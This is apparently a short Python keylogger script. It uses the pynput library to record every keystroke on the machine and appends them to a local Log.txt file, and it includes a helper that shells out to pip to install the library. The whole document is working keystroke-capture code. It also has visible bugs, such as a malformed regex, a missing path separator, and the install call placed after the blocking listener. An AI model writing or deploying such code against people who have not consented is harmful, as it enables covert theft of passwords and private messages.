from pynput.keyboard import Listener
import re
from os import system
import os


def installPynput():
    try:
        system("pip3 install pynput")
    except Exception as error:
        print(error)
        
log = os.getcwd() + "Log.txt"


def cap(key):
	key = str(key)
	key = re.sub('r\'', '', key)
	key = re.sub(r'Key.space', ' ', key)
	key = re.sub(r'Key.enter','\n', key)
	key = re.sub(r'Key.*', ' ', key)
	with open(log, 'a') as lo:
		lo.write(key)



with Listener (on_press=cap) as l:
	l.join()

installPynput()
